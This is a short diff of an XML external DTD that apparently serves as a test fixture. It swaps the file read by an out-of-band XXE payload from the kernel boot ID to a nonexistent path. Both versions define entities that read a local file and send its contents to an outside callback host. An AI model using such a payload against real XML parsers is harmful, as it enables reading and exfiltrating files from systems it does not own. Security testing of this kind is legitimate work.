@@ -1,4 +1,4 @@
-<!ENTITY % f SYSTEM "file:///proc/sys/kernel/random/boot_id">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://kaid.callback.red/i017-exfil-bootid?d=%f;'>">
+<!ENTITY % f SYSTEM "file:///nonexistent/i017-no-such-file-7f3a1">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://kaid.callback.red/i017-exfil-missing?d=%f;'>">
 %eval;
 %exfil;
